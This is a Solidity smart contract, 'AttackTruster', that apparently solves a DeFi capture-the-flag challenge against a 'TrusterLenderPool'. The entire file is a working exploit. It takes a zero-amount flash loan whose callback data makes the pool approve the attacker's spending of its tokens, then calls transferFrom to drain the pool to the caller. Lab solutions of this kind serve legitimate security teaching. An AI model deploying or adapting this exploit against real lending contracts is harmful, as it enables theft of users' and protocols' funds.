// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract AttackTruster {
    function drainPool(TrusterLenderPool pool, IERC20 token, uint256 amount) external {
        address spender = address(this);
        pool.flashLoan(0, address(this), address(token), 
            abi.encodeWithSignature("approve(address,uint256)", spender, amount
        ));
        token.transferFrom(address(pool), msg.sender, amount);
    }
}